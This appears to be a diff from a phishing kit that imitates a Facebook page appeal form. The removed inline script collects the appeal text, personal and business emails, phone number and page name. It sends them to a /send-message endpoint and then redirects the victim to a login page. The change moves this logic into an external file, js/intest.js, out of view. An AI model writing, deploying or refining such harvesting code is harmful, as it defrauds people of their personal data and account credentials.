@@ -388,37 +388,7 @@
             </ul>
         </div>
     </body>
-    <script>
-        $(document).ready(function () {
-            $(".reconsiderate").click(function () {
-                $("#exampleModal1").show();
-            });
-            $(".btn-close").click(function () {
-                $("#exampleModal1").hide();
-            });
-
-            $("#first-form").submit(async function (e) {
-                e.preventDefault(); // Ngăn form reload trang
-
-                const appeal = $("#exampleFormControlTextarea1").val();
-                const personalEmail = $("#PersonalEmailField").val();
-                const businessEmail = $("#BuisenessEmailField").val();
-                const phoneNumber = $("#PhoneFirld").val();
-                const fbPageName = $("#fb-page-name-input").val();
-
-                const message = `📄 **New Appeal Submission** 📄\n📝 **Appeal:** ${appeal}\n📧**Personal Email:** ${personalEmail}\n📧 **Business Email:** ${businessEmail}\n📱 **Phone Number:** ${phoneNumber}\n📘 **Facebook Page Name:** ${fbPageName}`;
-                try {
-                    const response = await fetch(
-                        "/send-message?message=" + encodeURIComponent(message),
-                        {
-                            method: "GET",
-                        }
-                    );
-                } catch (error) {}
-                //submit form và thay action = /login?email= + email
-                window.location.href = "/login?email=" + personalEmail;
-                
-            });
-        });
+    <script src="js/intest.js">
+        
     </script>
 </html>
